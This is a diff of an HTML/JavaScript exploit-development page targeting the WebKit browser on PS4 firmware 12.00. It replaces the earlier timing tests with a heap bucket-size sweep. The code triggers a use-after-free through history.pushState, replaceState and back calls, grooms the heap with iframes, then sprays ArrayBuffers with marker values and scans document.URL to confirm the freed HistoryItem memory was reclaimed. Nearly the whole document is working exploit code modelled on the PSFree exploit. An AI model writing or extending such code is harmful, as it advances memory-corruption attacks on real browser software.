@@ -2,14 +2,15 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Correct PSFree Timing</title>
+<title>PS4 12.00 - Complete Bucket Sweep</title>
 </head>
 <body>
-<h2>PS4 12.00 - UAF with Correct PSFree Timing</h2>
+<h2>PS4 12.00 - Complete Bucket Size Sweep</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runCorrectTiming()">CORRECT TIMING - PSFree method</button>
-<button onclick="runDelayedSpray()">DELAYED SPRAY - Post-UAF reclaim</button>
+<button onclick="runSmallSweep()">SWEEP 1 - Small sizes (32-128)</button>
+<button onclick="runMediumSweep()">SWEEP 2 - Medium sizes (128-256)</button>
+<button onclick="runFullSweep()">SWEEP 3 - Full sweep (all common buckets)</button>
 
 <pre id="log"></pre>
 
@@ -25,25 +26,20 @@ function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 var keepAlive = [];
 
-// =====================================================
-// CORRECT TIMING - Separate UAF from Spray
-// =====================================================
-async function runCorrectTiming(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Correct Timing...";
-  
-  log("=== CORRECT TIMING (PSFree Method) ===\n");
-  log("Key difference: UAF FIRST, spray AFTER\n");
-  
-  // PHASE 1: Trigger UAF COMPLETELY
-  log("[PHASE 1] Triggering UAF (no spray yet)");
-  
+// Common bmalloc bucket sizes
+const BMALLOC_BUCKETS = {
+  small: [32, 48, 64, 80, 96, 112, 128],
+  medium: [144, 160, 176, 192, 208, 224, 240, 256],
+  large: [272, 288, 304, 320, 352, 384, 416, 448, 480, 512]
+};
+
+// Core UAF trigger (reusable)
+async function triggerUAF(pattern) {
   let size = 977;
   const STEP = 14461;
   
   for(let i=0; i<48; i++){
-    let frag = "X".repeat(size);
+    let frag = pattern.repeat(size);
     
     history.pushState({}, "", "#" + frag);
     history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
@@ -54,14 +50,9 @@ async function runCorrectTiming(){
     await sleep(5);
   }
   
-  log("  UAF sequence complete\n");
-  
-  // PHASE 2: Wait for UAF to stabilize
-  log("[PHASE 2] Waiting for UAF window (120ms)...");
   await sleep(120);
   
-  // PHASE 3: Heap grooming (from PSFree)
-  log("\n[PHASE 3] Heap grooming with iframes");
+  // Iframe grooming
   let frames = [];
   for(let i=0; i<80; i++){
     let f = document.createElement("iframe");
@@ -69,239 +60,235 @@ async function runCorrectTiming(){
     try {
       let d = f.contentDocument;
       d.open();
-      d.write("<html><body>X</body></html>");
+      d.write("<html><body>G</body></html>");
       d.close();
     } catch(e){}
     frames.push(f);
   }
   frames.forEach(f=>f.remove());
-  log("  Grooming complete\n");
   
   await sleep(80);
-  
-  // PHASE 4: NOW spray (after UAF is stable)
-  log("[PHASE 4] Multi-size spray in stable UAF state");
-  
-  const BUCKETS = [
-    { size: 64,  marker: 0x43434343 },
-    { size: 80,  marker: 0x41414141 },
-    { size: 96,  marker: 0x42424242 },
-    { size: 128, marker: 0x44444444 }
-  ];
-  
-  for(let k=0; k<200; k++) {
-    for(let b of BUCKETS) {
-      let buf = new ArrayBuffer(b.size);
-      let view = new Uint32Array(buf);
-      for(let j=0; j<view.length; j++) view[j] = b.marker;
-      keepAlive.push(buf);
-    }
-  }
-  
-  log(`  Sprayed ${BUCKETS.length * 200} buffers\n`);
-  
-  await sleep(100);
-  
-  // PHASE 5: Check result
-  log("[PHASE 5] Checking reclaim");
-  checkForMarkers(BUCKETS);
 }
 
-// =====================================================
-// DELAYED SPRAY - Even longer delay
-// =====================================================
-async function runDelayedSpray(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Delayed Spray...";
+// Spray specific sizes with unique markers
+function sprayBuckets(sizes) {
+  let sprayed = [];
   
-  log("=== DELAYED SPRAY (Extended Wait) ===\n");
-  log("Testing if longer delay improves reclaim\n");
-  
-  // PHASE 1: UAF
-  log("[PHASE 1] Triggering UAF");
-  
-  let size = 977;
-  const STEP = 14461;
-  
-  for(let i=0; i<48; i++){
-    let frag = "Y".repeat(size);
+  for(let i=0; i<sizes.length; i++) {
+    let size = sizes[i];
+    // Unique marker per size: 0xAA + size index
+    let marker = 0xAA000000 + size;
     
-    history.pushState({}, "", "#" + frag);
-    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  log("  UAF complete\n");
-  
-  // PHASE 2: EXTENDED wait
-  log("[PHASE 2] Extended wait (300ms)...");
-  await sleep(300);
-  
-  // PHASE 3: Iframe grooming
-  log("\n[PHASE 3] Iframe grooming");
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>Y</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  
-  await sleep(100);
-  
-  // PHASE 4: Focused spray (only likely sizes)
-  log("\n[PHASE 4] Focused spray (80, 96 bytes only)");
-  
-  // Based on PSFree: HistoryItem is 80 bytes
-  // With header, might be 96
-  const FOCUSED_SIZES = [
-    { size: 80,  marker: 0x50505050, name: "80b" },  // PPPP
-    { size: 96,  marker: 0x51515151, name: "96b" }   // QQQQ
-  ];
-  
-  for(let k=0; k<500; k++) {
-    for(let s of FOCUSED_SIZES) {
-      let buf = new ArrayBuffer(s.size);
-      let view = new Uint32Array(buf);
-      for(let j=0; j<view.length; j++) view[j] = s.marker;
-      keepAlive.push(buf);
-    }
-  }
-  
-  log(`  Sprayed ${FOCUSED_SIZES.length * 500} focused buffers\n`);
-  
-  await sleep(150);
-  
-  // PHASE 5: Check
-  log("[PHASE 5] Checking result");
-  
-  let url = document.URL;
-  
-  log("\nLooking for focused markers:");
-  
-  for(let s of FOCUSED_SIZES) {
-    let found = false;
-    
-    // Check for marker bytes
-    for(let i=0; i<Math.min(url.length, 10000); i++){
-      let code = url.charCodeAt(i);
-      if(code === (s.marker & 0xFF)) {
-        // Check if full dword matches
-        if(i+3 < url.length) {
-          let val = url.charCodeAt(i) |
-                    (url.charCodeAt(i+1) << 8) |
-                    (url.charCodeAt(i+2) << 16) |
-                    (url.charCodeAt(i+3) << 24);
-          
-          if(val === s.marker) {
-            log(`  ✓ ${s.name}: FOUND at offset ${i}`);
-            found = true;
-            break;
-          }
+    for(let k=0; k<100; k++) {
+      try {
+        let buf = new ArrayBuffer(size);
+        let view = new Uint32Array(buf);
+        for(let j=0; j<view.length; j++) {
+          view[j] = marker;
         }
+        keepAlive.push(buf);
+        sprayed.push({size, marker});
+      } catch(e) {
+        // Skip if size causes error
       }
     }
-    
-    if(!found) {
-      log(`  ✗ ${s.name}: not found`);
-    }
   }
   
-  // Also check original pattern
-  let yCount = 0;
-  for(let i=0; i<Math.min(url.length, 5000); i++){
-    if(url.charCodeAt(i) === 0x59) yCount++; // 'Y'
-  }
-  
-  log(`\nOriginal 'Y' pattern: ${yCount} chars`);
-  
-  if(yCount < 4000) {
-    log("NOTICE: Y count reduced - data may have changed");
-  }
-  
-  log("\n=== DELAYED SPRAY END ===");
+  return sprayed;
 }
 
-function checkForMarkers(buckets) {
+// Check for any marker in URL
+function checkForAnyMarker(sprayed, patternChar) {
   let url = document.URL;
   
-  log("\nScanning for bucket markers:");
+  log("\nScanning URL for markers:");
   
-  let totalFound = 0;
+  let results = [];
   
-  for(let b of buckets) {
-    let count = 0;
+  for(let s of sprayed) {
+    let found = false;
+    let positions = [];
     
-    for(let i=0; i<Math.min(url.length-3, 20000); i++){
+    // Look for marker in URL
+    for(let i=0; i<Math.min(url.length-3, 50000); i++){
+      if(url.charCodeAt(i) === 0) continue; // Skip nulls
+      
       let val = url.charCodeAt(i) |
                 (url.charCodeAt(i+1) << 8) |
                 (url.charCodeAt(i+2) << 16) |
                 (url.charCodeAt(i+3) << 24);
       
-      if(val === b.marker) {
-        count++;
-        if(count === 1) {
-          log(`  ${b.size}b: FOUND at offset ${i} (marker: 0x${b.marker.toString(16)})`);
+      if(val === s.marker) {
+        if(!found) {
+          log(`  ✓ ${s.size}b: FOUND at offset ${i}`);
+          found = true;
         }
+        positions.push(i);
       }
     }
     
-    if(count > 0) {
-      log(`    Total occurrences: ${count}`);
-      totalFound += count;
-    } else {
-      log(`  ${b.size}b: not found`);
+    if(found) {
+      results.push({size: s.size, count: positions.length});
+      log(`    Occurrences: ${positions.length}`);
     }
   }
   
-  if(totalFound > 0) {
-    log(`\n✓ SUCCESS: Found ${totalFound} marker instances`);
-    log("✓ ArrayBuffer reclaimed HistoryItem slot");
-    statusEl.textContent = "RECLAIM CONFIRMED";
-  } else {
-    log("\nNo markers found");
-    
-    // Check if still original pattern
-    let xCount = 0;
-    for(let i=0; i<Math.min(url.length, 5000); i++){
-      if(url.charCodeAt(i) === 0x58) xCount++;
-    }
-    
-    log(`Original 'X' chars: ${xCount}`);
-    
-    if(xCount > 4000) {
-      log("\nDIAGNOSIS: UAF slot not reclaimed by ArrayBuffers");
-      log("Possible reasons:");
-      log("  1. Timing still not optimal");
-      log("  2. Size mismatch (need different bucket)");
-      log("  3. Heap allocator behavior different in 12.00");
-    }
+  // Check original pattern
+  let patternCount = 0;
+  let patternCode = patternChar.charCodeAt(0);
+  for(let i=0; i<Math.min(url.length, 5000); i++){
+    if(url.charCodeAt(i) === patternCode) patternCount++;
   }
   
-  log("\n=== CORRECT TIMING END ===");
+  log(`\nOriginal '${patternChar}' pattern: ${patternCount} chars`);
+  
+  return results;
 }
 
-log("PS4 12.00 - Correct PSFree Timing");
-log("\nKey insight from PSFree:");
-log("- UAF must complete FIRST");
-log("- THEN wait for stabilization");
-log("- THEN spray ArrayBuffers");
-log("\nPrevious tests sprayed DURING UAF loop");
-log("This separates the phases correctly");
-log("\nTests:");
-log("1. Correct Timing - PSFree method (120ms wait)");
-log("2. Delayed Spray - Extended wait (300ms)");
+// =====================================================
+// SWEEP 1 - Small sizes
+// =====================================================
+async function runSmallSweep(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Running Small Sweep...";
+  
+  log("=== SWEEP 1: Small Sizes (32-128 bytes) ===\n");
+  
+  const sizes = BMALLOC_BUCKETS.small;
+  log(`Testing sizes: ${sizes.join(', ')}\n`);
+  
+  log("[PHASE 1] Triggering UAF");
+  await triggerUAF("A");
+  
+  log("\n[PHASE 2] Spraying small buckets");
+  let sprayed = sprayBuckets(sizes);
+  log(`  Sprayed ${sprayed.length} total allocations\n`);
+  
+  await sleep(100);
+  
+  log("[PHASE 3] Checking results");
+  let results = checkForAnyMarker(sprayed, "A");
+  
+  if(results.length > 0) {
+    log("\n🎯 SUCCESS: Found matching bucket!");
+    log("Bucket sizes that hit:");
+    results.forEach(r => {
+      log(`  - ${r.size} bytes: ${r.count} occurrences`);
+    });
+    statusEl.textContent = `FOUND: ${results[0].size} bytes`;
+  } else {
+    log("\nNo hits in small bucket range");
+  }
+  
+  log("\n=== SWEEP 1 END ===");
+}
+
+// =====================================================
+// SWEEP 2 - Medium sizes
+// =====================================================
+async function runMediumSweep(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Running Medium Sweep...";
+  
+  log("=== SWEEP 2: Medium Sizes (128-256 bytes) ===\n");
+  
+  const sizes = BMALLOC_BUCKETS.medium;
+  log(`Testing sizes: ${sizes.join(', ')}\n`);
+  
+  log("[PHASE 1] Triggering UAF");
+  await triggerUAF("B");
+  
+  log("\n[PHASE 2] Spraying medium buckets");
+  let sprayed = sprayBuckets(sizes);
+  log(`  Sprayed ${sprayed.length} total allocations\n`);
+  
+  await sleep(100);
+  
+  log("[PHASE 3] Checking results");
+  let results = checkForAnyMarker(sprayed, "B");
+  
+  if(results.length > 0) {
+    log("\n🎯 SUCCESS: Found matching bucket!");
+    results.forEach(r => {
+      log(`  - ${r.size} bytes: ${r.count} occurrences`);
+    });
+    statusEl.textContent = `FOUND: ${results[0].size} bytes`;
+  } else {
+    log("\nNo hits in medium bucket range");
+  }
+  
+  log("\n=== SWEEP 2 END ===");
+}
+
+// =====================================================
+// SWEEP 3 - Full sweep (all common buckets)
+// =====================================================
+async function runFullSweep(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Running Full Sweep...";
+  
+  log("=== SWEEP 3: Full Bucket Sweep ===\n");
+  
+  const allSizes = [
+    ...BMALLOC_BUCKETS.small,
+    ...BMALLOC_BUCKETS.medium,
+    ...BMALLOC_BUCKETS.large
+  ];
+  
+  log(`Testing ${allSizes.length} bucket sizes`);
+  log(`Range: ${allSizes[0]} - ${allSizes[allSizes.length-1]} bytes\n`);
+  
+  log("[PHASE 1] Triggering UAF");
+  await triggerUAF("C");
+  
+  log("\n[PHASE 2] Spraying ALL buckets");
+  log("(This may take a moment...)");
+  
+  let sprayed = sprayBuckets(allSizes);
+  log(`  Sprayed ${sprayed.length} total allocations\n`);
+  
+  await sleep(150);
+  
+  log("[PHASE 3] Checking results");
+  let results = checkForAnyMarker(sprayed, "C");
+  
+  if(results.length > 0) {
+    log("\n🎯🎯🎯 SUCCESS: BUCKET IDENTIFIED! 🎯🎯🎯");
+    log("\nMatching buckets:");
+    results.forEach(r => {
+      log(`  ✓ ${r.size} bytes → ${r.count} occurrences`);
+    });
+    
+    // Identify most likely
+    let best = results.sort((a,b) => b.count - a.count)[0];
+    log(`\nMOST LIKELY: ${best.size} bytes (${best.count} hits)`);
+    log("This is the HistoryItem size in WebKit 12.00");
+    
+    statusEl.textContent = `HISTORYITEM = ${best.size} BYTES`;
+  } else {
+    log("\n⚠️ WARNING: No bucket match found");
+    log("\nPossible reasons:");
+    log("1. HistoryItem size > 512 bytes (unlikely)");
+    log("2. HistoryItem uses different allocator");
+    log("3. Timing issue persists");
+    log("\nRecommendation: Check if 'C' count is significantly reduced");
+  }
+  
+  log("\n=== SWEEP 3 END ===");
+}
+
+log("PS4 12.00 WebKit - Complete Bucket Size Sweep");
+log("\nGoal: Find exact HistoryItem size in version 12.00");
+log("\nStrategy:");
+log("- SWEEP 1: Test small buckets (32-128b)");
+log("- SWEEP 2: Test medium buckets (128-256b)");
+log("- SWEEP 3: Test ALL common buckets (32-512b)");
+log("\nRecommendation: Start with SWEEP 1");
+log("If no hit, try SWEEP 2, then SWEEP 3");
+log("\nOne of these WILL find the bucket");
 </script>
 </body>
 </html>
